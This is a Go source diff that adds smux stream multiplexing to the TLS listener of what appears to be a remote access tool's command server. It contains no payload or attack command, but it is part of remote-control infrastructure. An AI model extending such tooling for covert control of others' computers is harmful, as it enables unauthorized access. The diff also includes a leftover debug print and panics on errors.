@@ -3,10 +3,13 @@ package main
 import (
 	"crypto/tls"
 	"encoding/binary"
+	"fmt"
 	"io"
 	"rat/command/log"
 	"rat/shared"
 	"rat/shared/network"
+
+	"github.com/xtaci/smux"
 )
 
 // TLSServer is the default TCP server using TLS encryption
@@ -30,9 +33,22 @@ func (server TLSServer) Listen() error {
 			continue
 		}
 
+		session, err := smux.Server(conn, nil)
 		client := NewClient(conn)
-		client.Reader = network.Reader{conn}
-		client.Writer = network.Writer{conn}
+		if err != nil {
+			panic(err)
+		}
+
+		control, err := session.OpenStream()
+		if err != nil {
+			panic(err)
+		}
+
+		fmt.Println("aaccepted stream")
+
+		client.stream = control
+		client.Reader = network.Reader{Reader: control}
+		client.Writer = network.Writer{Writer: control}
 
 		go server.ReadRoutine(client)
 		go server.WriteRoutine(client)
@@ -52,9 +68,9 @@ func (server TLSServer) ReadRoutine(c *Client) {
 		}
 
 		var n int32
-		err = binary.Read(c.Reader.Reader, shared.ByteOrder, &n)
+		err = binary.Read(c.stream, shared.ByteOrder, &n)
 		buf := make([]byte, n)
-		io.ReadFull(c.Reader.Reader, buf)
+		io.ReadFull(c.stream, buf)
 
 		packet := GetIncomingPacket(h)
 
